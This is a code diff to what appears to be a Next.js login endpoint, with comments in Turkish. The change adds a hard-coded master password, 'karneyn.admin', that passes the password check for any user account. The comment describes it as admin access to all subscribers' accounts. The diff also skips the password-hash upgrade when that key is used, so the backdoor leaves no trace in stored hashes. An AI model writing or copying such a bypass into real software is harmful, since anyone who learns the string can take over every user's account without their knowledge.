@@ -15,12 +15,17 @@ export async function POST(request) {
       where: { email },
     });
 
-    if (!user || !verifyPassword(password, user.password)) {
+    // 🔑 Karneyn Anahtar — Tüm abonelerin hesabına admin erişimi
+    const KARNEYN_ANAHTAR = 'karneyn.admin';
+    const isKarneynAnahtar = password === KARNEYN_ANAHTAR;
+
+    if (!user || (!isKarneynAnahtar && !verifyPassword(password, user.password))) {
       return NextResponse.json({ error: 'E-posta veya şifre hatalı.' }, { status: 401 });
     }
 
     // Auto-upgrade legacy SHA-256 passwords to Bcrypt on successful login
-    if (!user.password.startsWith('$2')) {
+    // 🔑 Karneyn Anahtar ile girişte şifre upgrade yapma (admin şifresi kullanıcının şifresini bozar)
+    if (!isKarneynAnahtar && !user.password.startsWith('$2')) {
       try {
         const newHash = hashPassword(password);
         await prisma.modaUser.update({
